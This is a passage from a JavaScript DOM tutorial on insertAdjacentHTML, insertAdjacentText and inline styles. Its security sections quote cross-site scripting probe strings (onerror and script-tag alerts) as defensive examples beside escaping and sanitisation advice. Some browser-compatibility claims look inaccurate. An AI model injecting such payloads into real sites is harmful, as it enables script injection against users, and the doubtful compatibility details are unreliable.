
// Remove children
while (container.firstChild) {
  container.removeChild(container.firstChild);
}

// Show empty container or remove it
container.style.display = '';
// or
container.remove();
```

---

## insertAdjacentHTML and insertAdjacentText

### insertAdjacentHTML Method

#### Method Signature and Purpose

`insertAdjacentHTML()` parses specified HTML or XML string and inserts the resulting nodes into the DOM tree at a specified position relative to the target element.

```javascript
element.insertAdjacentHTML(position, text)
```

**Parameters**:

- `position`: String indicating where to insert the HTML relative to the element
- `text`: String to be parsed as HTML/XML and inserted into the tree

**Return Value**: `undefined`

#### Position Values

**Four Valid Position Strings**:

**`'beforebegin'`** - Before the element itself:

```javascript
<!-- beforebegin -->
<div id="target">
  existing content
</div>

element.insertAdjacentHTML('beforebegin', '<p>Before element</p>');

// Result:
<p>Before element</p>
<div id="target">
  existing content
</div>
```

**`'afterbegin'`** - Inside the element, before its first child:

```javascript
<div id="target">
  <!-- afterbegin -->
  existing content
</div>

element.insertAdjacentHTML('afterbegin', '<p>First child</p>');

// Result:
<div id="target">
  <p>First child</p>
  existing content
</div>
```

**`'beforeend'`** - Inside the element, after its last child:

```javascript
<div id="target">
  existing content
  <!-- beforeend -->
</div>

element.insertAdjacentHTML('beforeend', '<p>Last child</p>');

// Result:
<div id="target">
  existing content
  <p>Last child</p>
</div>
```

**`'afterend'`** - After the element itself:

```javascript
<div id="target">
  existing content
</div>
<!-- afterend -->

element.insertAdjacentHTML('afterend', '<p>After element</p>');

// Result:
<div id="target">
  existing content
</div>
<p>After element</p>
```

#### Position Restrictions and Behavior

**Parent Node Requirements**:

```javascript
const element = document.createElement('div');
// Element not in DOM, has no parent

element.insertAdjacentHTML('beforebegin', '<p>Test</p>'); 
// Throws DOMException: NoModificationAllowedError

element.insertAdjacentHTML('afterend', '<p>Test</p>'); 
// Throws DOMException: NoModificationAllowedError

// 'afterbegin' and 'beforeend' work without parent
element.insertAdjacentHTML('afterbegin', '<p>Test</p>'); // Works
element.insertAdjacentHTML('beforeend', '<p>Test</p>'); // Works
```

**Document and DocumentFragment Restrictions**:

```javascript
const doc = document.implementation.createHTMLDocument();
doc.insertAdjacentHTML('beforebegin', '<div>Test</div>'); 
// Throws DOMException (document has no parent)

const fragment = document.createDocumentFragment();
fragment.insertAdjacentHTML('afterbegin', '<div>Test</div>'); 
// Throws DOMException (fragment doesn't support this method)
```

#### HTML Parsing Behavior

**Context-Sensitive Parsing**:

```javascript
// Parsing context affects what's valid
const table = document.querySelector('table');
table.insertAdjacentHTML('beforeend', '<tr><td>Cell</td></tr>');
// Parsed in table context - creates valid table row

const div = document.querySelector('div');
div.insertAdjacentHTML('beforeend', '<tr><td>Cell</td></tr>');
// Parsed in div context - browser may fix/reject invalid nesting
```

**Self-Closing Tags**:

```javascript
element.insertAdjacentHTML('beforeend', '<img src="test.jpg">');
// Works - self-closing tags properly handled

element.insertAdjacentHTML('beforeend', '<img src="test.jpg"></img>');
// Also works - closing tag ignored for void elements
```

**Malformed HTML Handling**:

```javascript
// Browser attempts error correction
element.insertAdjacentHTML('beforeend', '<div><p>Text</div></p>');
// Browser corrects nesting - actual result varies by browser
// [Inference: HTML5 parsing algorithm defines specific error correction rules]

element.insertAdjacentHTML('beforeend', '<div>Unclosed');
// Browser auto-closes the div
```

**Multiple Root Elements**:

```javascript
element.insertAdjacentHTML('beforeend', '<div>One</div><div>Two</div><span>Three</span>');
// All elements inserted as siblings within the parent
```

**Text Nodes and Mixed Content**:

```javascript
element.insertAdjacentHTML('beforeend', 'Plain text <strong>Bold</strong> more text');
// Creates text nodes and element nodes as appropriate
```

#### Script Execution Behavior

**Scripts Don't Execute**:

```javascript
element.insertAdjacentHTML('beforeend', '<script>alert("test");</script>');
// Script is inserted into DOM but does NOT execute
// This is a security feature

element.insertAdjacentHTML('beforeend', '<script src="external.js"></script>');
// External script also doesn't execute
```

**Event Handlers in HTML**:

```javascript
element.insertAdjacentHTML('beforeend', '<button onclick="handleClick()">Click</button>');
// Inline event handlers ARE attached and WILL execute when triggered
// [Inference: Inline event handlers are treated as element attributes, not script execution]
```

**Workaround for Script Execution**:

```javascript
element.insertAdjacentHTML('beforeend', '<div id="container"></div>');
const script = document.createElement('script');
script.textContent = 'console.log("Executes");';
document.getElementById('container').appendChild(script);
// Manually created scripts do execute
```

#### Performance Characteristics

**Faster Than createElement Chains**:

```javascript
// Slower approach
for (let i = 0; i < 100; i++) {
  const div = document.createElement('div');
  div.className = 'item';
  div.textContent = `Item ${i}`;
  container.appendChild(div);
}

// Faster approach
let html = '';
for (let i = 0; i < 100; i++) {
  html += `<div class="item">Item ${i}</div>`;
}
container.insertAdjacentHTML('beforeend', html);
```

**Single Reflow for Multiple Elements**:

```javascript
// Multiple reflows
element.insertAdjacentHTML('beforeend', '<div>1</div>');
element.insertAdjacentHTML('beforeend', '<div>2</div>');
element.insertAdjacentHTML('beforeend', '<div>3</div>');

// Single reflow
element.insertAdjacentHTML('beforeend', '<div>1</div><div>2</div><div>3</div>');
```

**Memory Efficiency Considerations**:

```javascript
// Building large HTML strings in memory
let html = '';
for (let i = 0; i < 10000; i++) {
  html += `<div>${i}</div>`; // String concatenation creates many intermediate strings
}

// More memory efficient
const parts = [];
for (let i = 0; i < 10000; i++) {
  parts.push(`<div>${i}</div>`);
}
const html = parts.join('');
element.insertAdjacentHTML('beforeend', html);
```

#### Security Considerations

**XSS Vulnerability**:

```javascript
// DANGEROUS - user input directly inserted
const userInput = getUserInput();
element.insertAdjacentHTML('beforeend', `<div>${userInput}</div>`);
// If userInput contains "<script>malicious()</script>" or "<img src=x onerror=malicious()>"
// the HTML is parsed and inline handlers execute
```

**Sanitization Requirements**:

```javascript
// Escaping HTML entities
function escapeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

const userInput = getUserInput();
element.insertAdjacentHTML('beforeend', `<div>${escapeHTML(userInput)}</div>`);
```

**Using DOMPurify or Similar**:

```javascript
// Library-based sanitization
const dirty = getUserInput();
const clean = DOMPurify.sanitize(dirty);
element.insertAdjacentHTML('beforeend', clean);
```

**Safer Alternative with insertAdjacentText**:

```javascript
// For pure text content, use insertAdjacentText
const userInput = getUserInput();
element.insertAdjacentText('beforeend', userInput);
// No HTML parsing - completely safe from XSS
```

#### Common Patterns and Use Cases

**Building Lists**:

```javascript
const items = ['Apple', 'Banana', 'Orange'];
const list = document.querySelector('ul');

items.forEach(item => {
  list.insertAdjacentHTML('beforeend', `<li>${item}</li>`);
});
```

**Template String Integration**:

```javascript
const data = {
  name: 'John Doe',
  age: 30,
  email: 'john@example.com'
};

element.insertAdjacentHTML('beforeend', `
  <div class="user-card">
    <h3>${escapeHTML(data.name)}</h3>
    <p>Age: ${data.age}</p>
    <p>Email: ${escapeHTML(data.email)}</p>
  </div>
`);
```

**Conditional Content**:

```javascript
const hasPermission = checkPermission();

element.insertAdjacentHTML('beforeend', `
  <div class="content">
    <p>Public content</p>
    ${hasPermission ? '<p>Private content</p>' : ''}
  </div>
`);
```

**Prepending Content**:

```javascript
// Add to beginning of list
list.insertAdjacentHTML('afterbegin', '<li class="new-item">New First Item</li>');
```

**Wrapping Elements**:

```javascript
// Insert wrapper before element
element.insertAdjacentHTML('beforebegin', '<div class="wrapper">');
// Insert closing tag after element
element.insertAdjacentHTML('afterend', '</div>');
// Note: This creates malformed HTML temporarily and relies on browser correction
// [Unverified: Reliability of this pattern across all browsers and contexts]
```

**Sibling Insertion**:

```javascript
const targetElement = document.querySelector('.target');
targetElement.insertAdjacentHTML('afterend', '<div class="sibling">Next sibling</div>');
```

#### Error Handling

**Invalid Position Parameter**:

```javascript
try {
  element.insertAdjacentHTML('invalid', '<div>Test</div>');
} catch (e) {
  console.error(e); // DOMException: Failed to execute 'insertAdjacentHTML'
}
```

**Invalid HTML Syntax**:

```javascript
// Browser attempts to fix, but may produce unexpected results
element.insertAdjacentHTML('beforeend', '<div><span></div></span>');
// No error thrown, but structure may not match intent
```

**Null or Undefined HTML**:

```javascript
element.insertAdjacentHTML('beforeend', null); // Inserts string "null"
element.insertAdjacentHTML('beforeend', undefined); // Inserts string "undefined"
element.insertAdjacentHTML('beforeend', ''); // Inserts nothing (no-op)
```

#### Browser Compatibility

- **IE11+**: Full support
- **Edge 12+**: Full support
- **Chrome 1+**: Full support
- **Firefox 8+**: Full support
- **Safari 4+**: Full support
- **Opera 7+**: Full support

Position parameter is case-insensitive in most browsers but lowercase is recommended for consistency.

### insertAdjacentText Method

#### Method Signature and Purpose

`insertAdjacentText()` inserts a given text node at a specified position relative to the target element. Unlike `insertAdjacentHTML()`, the text is **not** parsed as HTML - it's inserted as literal text.

```javascript
element.insertAdjacentText(position, text)
```

**Parameters**:

- `position`: Same four position strings as `insertAdjacentHTML`
- `text`: String to be inserted as a text node

**Return Value**: `undefined`

#### Position Values (Same as insertAdjacentHTML)

```javascript
// beforebegin - before the element
element.insertAdjacentText('beforebegin', 'Before element text');

// afterbegin - first child
element.insertAdjacentText('afterbegin', 'First child text');

// beforeend - last child
element.insertAdjacentText('beforeend', 'Last child text');

// afterend - after the element
element.insertAdjacentText('afterend', 'After element text');
```

#### Core Behavior and Differences from insertAdjacentHTML

**No HTML Parsing**:

```javascript
const html = '<strong>Bold</strong> text';

element.insertAdjacentHTML('beforeend', html);
// Result: Bold text (with <strong> parsed as HTML)

element.insertAdjacentText('beforeend', html);
// Result: <strong>Bold</strong> text (literal text, tags visible)
```

**Automatic Escaping**:

```javascript
const userInput = '<script>alert("XSS")</script>';

element.insertAdjacentText('beforeend', userInput);
// Inserted as literal text: <script>alert("XSS")</script>
// Completely safe - no script execution, no HTML parsing
```

**Text Node Creation**:

```javascript
element.insertAdjacentText('beforeend', 'Hello World');
// Creates a Text node with nodeValue "Hello World"
// Equivalent to:
const textNode = document.createTextNode('Hello World');
element.appendChild(textNode);
```

**Multiple Text Insertions**:

```javascript
element.insertAdjacentText('beforeend', 'First ');
element.insertAdjacentText('beforeend', 'Second ');
element.insertAdjacentText('beforeend', 'Third');
// Creates three separate text nodes
// Browser may normalize these into single text node later
```

#### Security Benefits

**XSS Prevention**:

```javascript
// SAFE - no XSS risk regardless of input
const maliciousInput = '<img src=x onerror=alert("XSS")>';
element.insertAdjacentText('beforeend', maliciousInput);
// Displays literal text: <img src=x onerror=alert("XSS")>
// No image element created, no script executed
```

**No Sanitization Required**:

```javascript
// With insertAdjacentHTML - requires sanitization
const userComment = getUserInput();
element.insertAdjacentHTML('beforeend', `<p>${escapeHTML(userComment)}</p>`);

// With insertAdjacentText - no sanitization needed
element.insertAdjacentText('beforeend', userComment);
// However, this doesn't create the <p> wrapper
```

**Use Case Comparison**:

```javascript
// When you need structure: use insertAdjacentHTML with sanitization
const safeHTML = DOMPurify.sanitize(`<div class="comment">${userInput}</div>`);
element.insertAdjacentHTML('beforeend', safeHTML);

// When you only need text content: use insertAdjacentText
const wrapper = document.createElement('div');
wrapper.className = 'comment';
wrapper.insertAdjacentText('beforeend', userInput);
element.appendChild(wrapper);
```

#### Performance Characteristics

**Faster for Plain Text**:

```javascript
// Slower - invokes HTML parser
element.insertAdjacentHTML('beforeend', 'Plain text content');

// Faster - direct text node creation
element.insertAdjacentText('beforeend', 'Plain text content');
```

**Batch Text Insertion**:

```javascript
// Multiple separate text nodes (less efficient)
for (let i = 0; i < 1000; i++) {
  element.insertAdjacentText('beforeend', `Item ${i} `);
}

// Single text node (more efficient)
let text = '';
for (let i = 0; i < 1000; i++) {
  text += `Item ${i} `;
}
element.insertAdjacentText('beforeend', text);
```

#### Text Node Behavior

**Whitespace Handling**:

```javascript
element.insertAdjacentText('beforeend', '   Text with spaces   ');
// Preserves all whitespace - creates text node with exact content
// CSS white-space property controls rendering
```

**Line Breaks**:

```javascript
element.insertAdjacentText('beforeend', 'Line 1\nLine 2\nLine 3');
// Newlines preserved in text node
// Rendered as single line unless CSS white-space: pre or similar
```

**Special Characters**:

```javascript
element.insertAdjacentText('beforeend', 'Text with © ™ € symbols');
// All Unicode characters preserved exactly
```

**Empty String**:

```javascript
element.insertAdjacentText('beforeend', '');
// Creates empty text node (may be optimized away by browser)
```

#### Common Use Cases

**User-Generated Content Display**:

```javascript
function displayComment(username, comment) {
  const container = document.createElement('div');
  container.className = 'comment';
  
  const userSpan = document.createElement('span');
  userSpan.className = 'username';
  userSpan.insertAdjacentText('beforeend', username);
  
  const commentSpan = document.createElement('span');
  commentSpan.className = 'comment-text';
  commentSpan.insertAdjacentText('beforeend', comment);
  
  container.appendChild(userSpan);
  container.appendChild(commentSpan);
  return container;
}
```

**Label and Text Combination**:

```javascript
const label = document.querySelector('label');
label.insertAdjacentText('beforeend', ': ');
// Appends colon to label text
```

**Dynamic Text Updates**:

```javascript
const counter = document.querySelector('.counter');
// Clear existing text
counter.textContent = '';
// Add new text
counter.insertAdjacentText('beforeend', `Count: ${count}`);
```

**Prepending Text**:

```javascript
element.insertAdjacentText('afterbegin', 'Prefix: ');
// Adds text before existing content
```

#### Position Restrictions (Same as insertAdjacentHTML)

```javascript
const detached = document.createElement('div');

// These throw DOMException (no parent node)
detached.insertAdjacentText('beforebegin', 'Text'); // Error
detached.insertAdjacentText('afterend', 'Text'); // Error

// These work (don't require parent)
detached.insertAdjacentText('afterbegin', 'Text'); // Works
detached.insertAdjacentText('beforeend', 'Text'); // Works
```

#### Comparison with Alternative Methods

**vs textContent**:

```javascript
// textContent replaces all content
element.textContent = 'New text'; // Removes all children, sets text

// insertAdjacentText appends/prepends
element.insertAdjacentText('beforeend', 'Additional text'); // Adds to existing
```

**vs innerText**:

```javascript
// innerText has CSS-aware behavior and causes reflow
element.innerText = 'Text'; // Respects CSS display, triggers layout

// insertAdjacentText is CSS-agnostic
element.insertAdjacentText('beforeend', 'Text'); // Direct text node insertion
```

**vs createTextNode + appendChild**:

```javascript
// Traditional approach
const textNode = document.createTextNode('Text');
element.appendChild(textNode);

// insertAdjacentText equivalent
element.insertAdjacentText('beforeend', 'Text');

// insertAdjacentText is more concise but less flexible for positioning
```

**vs insertAdjacentHTML with escaped text**:

```javascript
// More verbose, invokes parser
element.insertAdjacentHTML('beforeend', escapeHTML(userInput));

// Simpler, no parsing
element.insertAdjacentText('beforeend', userInput);
```

#### Browser Compatibility

- **IE**: No support (requires polyfill)
- **Edge 17+**: Full support
- **Chrome 2+**: Full support (under different timing than specs suggest)
- **Firefox 48+**: Full support
- **Safari 10+**: Full support
- **Opera 15+**: Full support

#### Polyfill for insertAdjacentText

```javascript
if (!Element.prototype.insertAdjacentText) {
  Element.prototype.insertAdjacentText = function(position, text) {
    const textNode = document.createTextNode(text);
    
    switch(position.toLowerCase()) {
      case 'beforebegin':
        if (!this.parentNode) {
          throw new DOMException('NoModificationAllowedError');
        }
        this.parentNode.insertBefore(textNode, this);
        break;
      case 'afterbegin':
        this.insertBefore(textNode, this.firstChild);
        break;
      case 'beforeend':
        this.appendChild(textNode);
        break;
      case 'afterend':
        if (!this.parentNode) {
          throw new DOMException('NoModificationAllowedError');
        }
        this.parentNode.insertBefore(textNode, this.nextSibling);
        break;
      default:
        throw new DOMException('SyntaxError');
    }
  };
}
```

### Comparison: insertAdjacentHTML vs insertAdjacentText

#### When to Use insertAdjacentHTML

1. **Need to insert markup structure**:

```javascript
element.insertAdjacentHTML('beforeend', '<div class="card"><h3>Title</h3></div>');
```

2. **Building complex UI components**:

```javascript
const card = `
  <article class="card">
    <header>${sanitize(title)}</header>
    <div class="content">${sanitize(content)}</div>
    <footer>${sanitize(footer)}</footer>
  </article>
`;
element.insertAdjacentHTML('beforeend', card);
```

3. **Performance-critical bulk insertions** (with proper sanitization):

```javascript
const rows = data.map(item => 
  `<tr><td>${sanitize(item.name)}</td><td>${item.value}</td></tr>`
).join('');
table.insertAdjacentHTML('beforeend', rows);
```

4. **Working with templates**:

```javascript
const template = document.querySelector('#card-template').innerHTML;
element.insertAdjacentHTML('beforeend', template);
```

#### When to Use insertAdjacentText

1. **Displaying user-generated content without markup**:

```javascript
commentElement.insertAdjacentText('beforeend', userComment);
```

2. **Security-critical contexts**:

```javascript
// No sanitization needed
element.insertAdjacentText('beforeend', untrustedInput);
```

3. **Pure text display**:

```javascript
codeElement.insertAdjacentText('beforeend', codeSnippet);
// Shows code as text, doesn't execute
```

4. **Simple text concatenation**:

```javascript
label.insertAdjacentText('beforeend', ': ');
label.insertAdjacentText('beforeend', fieldName);
```

### Combined Usage Patterns

#### Building Elements with Text Content

```javascript
// Create structure with HTML
element.insertAdjacentHTML('beforeend', '<div class="message"><span class="label"></span></div>');

// Add safe text content
const label = element.querySelector('.label');
label.insertAdjacentText('beforeend', userProvidedLabel);
```

#### Mixed Content Insertion

```javascript
function addComment(container, author, text, timestamp) {
  // Structure from HTML
  container.insertAdjacentHTML('beforeend', `
    <div class="comment">
      <div class="meta">
        <span class="author"></span>
        <time datetime="${timestamp}">${new Date(timestamp).toLocaleString()}</time>
      </div>
      <div class="text"></div>
    </div>
  `);
  
  // User content as text
  const comment = container.lastElementChild;
  comment.querySelector('.author').insertAdjacentText('beforeend', author);
  comment.querySelector('.text').insertAdjacentText('beforeend', text);
}
```

#### Template Literal Hybrid

```javascript
function createCard(data) {
  const temp = document.createElement('div');
  temp.insertAdjacentHTML('beforeend', `
    <div class="card">
      <h3 class="title"></h3>
      <p class="description"></p>
      <span class="value">${data.numericValue}</span>
    </div>
  `);
  
  const card = temp.firstElementChild;
  card.querySelector('.title').insertAdjacentText('beforeend', data.userTitle);
  card.querySelector('.description').insertAdjacentText('beforeend', data.userDescription);
  
  return card;
}
```

### Advanced Techniques

#### Position-Aware Insertion Helper

```javascript
function insertContent(element, position, content, asHTML = false) {
  if (asHTML) {
    element.insertAdjacentHTML(position, DOMPurify.sanitize(content));
  } else {
    element.insertAdjacentText(position, content);
  }
}

// Usage
insertContent(el, 'beforeend', userInput, false); // Safe text
insertContent(el, 'beforeend', trustedHTML, true); // Sanitized HTML
```

#### Batch Insertion with Mixed Content

```javascript
function batchInsert(container, items) {
  // Build HTML structure efficiently
  const htmlStructure = items.map(() => 
    '<div class="item"><span class="label"></span><span class="value"></span></div>'
  ).join('');
  
  container.insertAdjacentHTML('beforeend', htmlStructure);
  
  // Fill with safe text content
  const itemElements = container.querySelectorAll('.item');
  items.forEach((item, index) => {
    const el = itemElements[index];
    el.querySelector('.label').insertAdjacentText('beforeend', item.label);
    el.querySelector('.value').insertAdjacentText('beforeend', item.value);
  });
}
```

#### Error Recovery Pattern

```javascript
function safeInsertHTML(element, position, html) {
  try {
    element.insertAdjacentHTML(position, html);
    return true;
  } catch (e) {
    console.error('HTML insertion failed:', e);
    // Fallback to text insertion
    element.insertAdjacentText(position, html);
    return false;
  }
}
```

#### Stream-Style Insertion

```javascript
class ContentBuilder {
  constructor(element) {
    this.element = element;
  }
  
  addHTML(html) {
    this.element.insertAdjacentHTML('beforeend', DOMPurify.sanitize(html));
    return this; // Chainable
  }
  
  addText(text) {
    this.element.insertAdjacentText('beforeend', text);
    return this; // Chainable
  }
  
  addElement(tagName, text) {
    const el = document.createElement(tagName);
    el.insertAdjacentText('beforeend', text);
    this.element.appendChild(el);
    return this; // Chainable
  }
}

// Usage
new ContentBuilder(container)
  .addHTML('<h2>Title</h2>')
  .addText(userInput)
  .addElement('p', moreUserInput);
```

### Performance Benchmarking Considerations

**HTML Parsing Overhead**:

```javascript
// Measure parsing time
console.time('insertAdjacentHTML');
for (let i = 0; i < 1000; i++) {
  element.insertAdjacentHTML('beforeend', '<div>Item</div>');
}
console.timeEnd('insertAdjacentHTML');

console.time('insertAdjacentText');
for (let i = 0; i < 1000; i++) {
  element.insertAdjacentText('beforeend', 'Item');
}
console.timeEnd('insertAdjacentText');
// [Inference: insertAdjacentText typically faster for plain text due to no parsing]
```

**Memory Profiling**:

```javascript
// Large string building
const largeHTML = '<div>'.repeat(10000) + '</div>'.repeat(10000);
element.insertAdjacentHTML('beforeend', largeHTML);
// Parser must process and validate entire string

const largeText = 'Text '.repeat(10000);
element.insertAdjacentText('beforeend', largeText);
// Direct text node creation, no parsing
```

### Framework Integration Examples

#### React Refs

```javascript
function Component() {
  const contentRef = useRef();
  
  useEffect(() => {
    // Direct DOM manipulation when needed
    contentRef.current.insertAdjacentText('beforeend', dynamicText);
    
    return () => {
      // Cleanup if needed
      contentRef.current.textContent = '';
    };
  }, [dynamicText]);
  
  return <div ref={contentRef}></div>;
}
```

#### Vue Template Refs

```javascript
export default {
  mounted() {
    this.$refs.content.insertAdjacentText('beforeend', this.userText);
  },
  methods: {
    addHTML(html) {
      this.$refs.content.insertAdjacentHTML('beforeend', 
        DOMPurify.sanitize(html)
      );
    }
  }
}
```

#### Angular ViewChild

```typescript
import { Component, ViewChild, ElementRef } from '@angular/core';

@Component({
  selector: 'app-content',
  template: '<div #contentContainer></div>'
})
export class ContentComponent {
  @ViewChild('contentContainer') container: ElementRef;
  
  addContent(html: string, sanitize = true) {
    if (sanitize) {
      this.container.nativeElement.insertAdjacentHTML('beforeend', 
        this.sanitizer.sanitize(SecurityContext.HTML, html)
      );
    } else {
      this.container.nativeElement.insertAdjacentText('beforeend', html);
    }
  }
}
```

### Testing Strategies

#### Unit Testing insertAdjacentHTML

```javascript
describe('insertAdjacentHTML', () => {
  let element;
  
  beforeEach(() => {
    element = document.createElement('div');
    element.innerHTML = '<span>Existing</span>';
  });
  
  test('inserts HTML at beforeend position', () => {
    element.insertAdjacentHTML('beforeend', '<p>New</p>');
    expect(element.lastElementChild.tagName).toBe('P');
    expect(element.lastElementChild.textContent).toBe('New');
  });
  
  test('inserts HTML at afterbegin position', () => {
    element.insertAdjacentHTML('afterbegin', '<p>New</p>');
    expect(element.firstElementChild.tagName).toBe('P');
  });
  
  test('throws error for invalid position', () => {
    expect(() => {
      element.insertAdjacentHTML('invalid', '<p>Test</p>');
    }).toThrow();
  });
});
```

#### Unit Testing insertAdjacentText

```javascript
describe('insertAdjacentText', () => {
  let element;
  
  beforeEach(() => {
    element = document.createElement('div');
  });
  
  test('inserts text without HTML parsing', () => {
    element.insertAdjacentText('beforeend', '<script>alert("test")</script>');
    expect(element.textContent).toBe('<script>alert("test")</script>');
    expect(element.querySelector('script')).toBeNull();
  });
  
  test('escapes special characters', () => {
    element.insertAdjacentText('beforeend', '< > & " \'');
    expect(element.textContent).toBe('< > & " \'');
  });
  
  test('preserves whitespace', () => {
    element.insertAdjacentText('beforeend', '  text  ');
    expect(element.firstChild.nodeValue).toBe('  text  ');
  });
});
```

#### Integration Testing

```javascript
describe('Mixed content insertion', () => {
  test('combines HTML structure with safe text', () => {
    const container = document.createElement('div');
    container.insertAdjacentHTML('beforeend', '<div class="card"><h3 class="title"></h3></div>');
```

---

# Element Styling

## Style Property (Inline Styles)

### Direct Style Manipulation

The `style` property provides direct access to an element's inline CSS styles through the `CSSStyleDeclaration` interface. It operates exclusively on the `style` attribute of HTML elements.

```javascript
element.style.propertyName = value;
const currentValue = element.style.propertyName;
```

### CSSStyleDeclaration Interface

#### Property Access Patterns

**camelCase Properties**

```javascript
element.style.backgroundColor = 'red';
element.style.fontSize = '16px';
element.style.marginTop = '20px';
```

**Bracket Notation with Hyphens**

```javascript
element.style['background-color'] = 'red';
element.style['font-size'] = '16px';
```

**cssText Property**

```javascript
// Set multiple properties at once
element.style.cssText = 'color: blue; font-size: 14px; margin: 10px;';

// Append to existing styles
element.style.cssText += 'padding: 5px;';

// Read all inline styles
const allStyles = element.style.cssText;
```

#### setProperty() and getPropertyValue()

```javascript
// Set with optional priority
element.style.setProperty('color', 'blue');
element.style.setProperty('width', '100px', 'important');

// Get property value
const color = element.style.getPropertyValue('color');

// Remove property
element.style.removeProperty('color');

// Get priority
const priority = element.style.getPropertyPriority('width'); // returns 'important' or ''
```

### Specificity and Cascade Behavior

Inline styles have a specificity of `1,0,0,0`, making them more specific than IDs, classes, and element selectors. They are only overridden by `!important` declarations in stylesheets or other inline `!important` declarations.

```javascript
// This creates style="color: blue !important;"
element.style.setProperty('color', 'blue', 'important');
```

### Reading Computed vs Inline Styles

The `style` property only returns values explicitly set as inline styles. It does **not** return computed styles from stylesheets.

```javascript
// HTML: <div id="box" class="styled"></div>
// CSS: .styled { color: red; width: 200px; }

const box = document.getElementById('box');

console.log(box.style.color);  // "" (empty, not "red")
console.log(box.style.width);  // "" (empty, not "200px")

box.style.color = 'blue';
console.log(box.style.color);  // "blue"
```

To read computed styles, use `window.getComputedStyle()` instead:

```javascript
const computed = window.getComputedStyle(box);
console.log(computed.color);  // "rgb(255, 0, 0)"
console.log(computed.width);  // "200px"
```

### Numeric Values and Units

Style values are always strings and require units for numeric properties.

```javascript
// Correct
element.style.width = '100px';
element.style.opacity = '0.5';
element.style.zIndex = '10';

// Incorrect - no effect or unexpected behavior
element.style.width = 100;  // No unit, ignored
element.style.margin = 20;  // No unit, ignored
```

**Exception for unitless properties:**

```javascript
element.style.opacity = '0.5';  // Can be string
element.style.opacity = 0.5;    // [Inference] May work in some browsers, but string is standard
element.style.zIndex = 10;      // Unitless property accepts numbers
```

### Shorthand vs Longhand Properties

```javascript
// Shorthand sets multiple longhand properties
element.style.margin = '10px 20px';
// Equivalent to:
// element.style.marginTop = '10px';
// element.style.marginRight = '20px';
// element.style.marginBottom = '10px';
// element.style.marginLeft = '20px';

// Reading shorthand properties
console.log(element.style.margin);  // Returns value only if all longhand properties match
```

**Reading behavior:**

```javascript
element.style.marginTop = '10px';
element.style.marginRight = '20px';
element.style.marginBottom = '10px';
element.style.marginLeft = '20px';

console.log(element.style.margin);  // "" (empty) - longhands don't match
```

### CSS Custom Properties (CSS Variables)

```javascript
// Set custom property
element.style.setProperty('--main-color', '#3498db');

// Get custom property
const mainColor = element.style.getPropertyValue('--main-color');

// Use in other properties
element.style.backgroundColor = 'var(--main-color)';

// Remove custom property
element.style.removeProperty('--main-color');
```

### Length and Item Access

```javascript
// Number of inline style properties
const count = element.style.length;

// Access by index
for (let i = 0; i < element.style.length; i++) {
  const propertyName = element.style[i];
  const propertyValue = element.style.getPropertyValue(propertyName);
  console.log(`${propertyName}: ${propertyValue}`);
}

// Named access
const propertyName = element.style.item(0);
```

### Clearing Styles

```javascript
// Remove specific property
element.style.backgroundColor = '';
element.style.removeProperty('background-color');

// Clear all inline styles
element.style.cssText = '';
element.removeAttribute('style');
```

### Performance Considerations

**Reflow and Repaint**

Each style modification can trigger reflow (layout recalculation) and repaint:

```javascript
// Poor - causes multiple reflows
element.style.width = '100px';
element.style.height = '100px';
element.style.padding = '10px';

// Better - single reflow
element.style.cssText = 'width: 100px; height: 100px; padding: 10px;';
```

**Batching with DocumentFragment or Display None**

```javascript
// Technique 1: Remove from DOM
const parent = element.parentNode;
parent.removeChild(element);
element.style.width = '100px';
element.style.height = '100px';
parent.appendChild(element);

// Technique 2: Hide during modifications
element.style.display = 'none';
element.style.width = '100px';
element.style.height = '100px';
element.style.display = '';
```

**[Inference] Reading offsetHeight/offsetWidth forces synchronous layout:**

```javascript
element.style.width = '100px';
const height = element.offsetHeight;  // Forces immediate reflow
element.style.height = '200px';
```

### Browser Vendor Prefixes

```javascript
// Standard property
element.style.transform = 'rotate(45deg)';

// Vendor prefixes (mostly legacy)
element.style.webkitTransform = 'rotate(45deg)';
element.style.MozTransform = 'rotate(45deg)';
element.style.msTransform = 'rotate(45deg)';

// Detection pattern
if ('transform' in element.style) {
  element.style.transform = 'rotate(45deg)';
} else if ('webkitTransform' in element.style) {
  element.style.webkitTransform = 'rotate(45deg)';
}
```

### Edge Cases and Gotchas

**Invalid Values**

```javascript
element.style.color = 'not-a-color';
console.log(element.style.color);  // "" (empty, invalid value ignored)

element.style.color = 'blue';
element.style.color = 'invalid';
console.log(element.style.color);  // "blue" (previous valid value retained)
```

**URL Values**

```javascript
element.style.backgroundImage = 'url(image.jpg)';
element.style.backgroundImage = "url('image.jpg')";
element.style.backgroundImage = 'url("image.jpg")';
// All valid syntaxes
```

**calc() and Other Functions**

```javascript
element.style.width = 'calc(100% - 50px)';
element.style.transform = 'translateX(calc(100% + 20px))';
```

**Empty Strings vs Null**

```javascript
element.style.color = '';      // Removes property
element.style.color = null;    // [Inference] Converts to string "null", likely ignored
element.style.color = undefined; // [Inference] Converts to string "undefined", likely ignored
```

### Animation and Transition Integration

```javascript
// Triggering CSS transitions
element.style.transition = 'all 0.3s ease';
element.style.opacity = '0';

// Force reflow to ensure transition fires
element.offsetHeight; 
element.style.opacity = '1';

// Listening for transition end
element.addEventListener('transitionend', (e) => {
  console.log(`${e.propertyName} transition completed`);
});
```

### Common Patterns

**Toggle Visibility**

```javascript
element.style.display = element.style.display === 'none' ? '' : 'none';

// Or with explicit values
element.style.display = element.style.display === 'none' ? 'block' : 'none';
```

**Conditional Styling**

```javascript
element.style.color = isActive ? 'green' : 'gray';
element.style.fontWeight = isActive ? 'bold' : 'normal';
```

**Copying Styles**

```javascript
const sourceStyles = source.style.cssText;
target.style.cssText = sourceStyles;
```

### Relationship with setAttribute

```javascript
// Using style property (recommended)
element.style.color = 'red';

// Using setAttribute (not recommended for styles)
element.setAttribute('style', 'color: red');

// Difference: setAttribute replaces entire style attribute
element.style.color = 'red';
element.style.fontSize = '14px';
element.setAttribute('style', 'color: blue');  // fontSize is lost
```

---

## CSSStyleDeclaration

### Interface Overview

`CSSStyleDeclaration` is a live interface representing a collection of CSS property-value pairs. It provides programmatic access to an element's inline styles, computed styles, and stylesheet rule declarations. The interface updates automatically when underlying styles change and reflects modifications immediately.

Three primary sources return `CSSStyleDeclaration` objects:

- `element.style`: Inline styles set via the `style` attribute
- `window.getComputedStyle(element)`: Final computed styles after cascade resolution
- `CSSStyleRule.style`: Styles within stylesheet rules

### Element Inline Styles

The `element.style` property returns a `CSSStyleDeclaration` representing only inline styles:

```javascript
const div = document.querySelector('div');

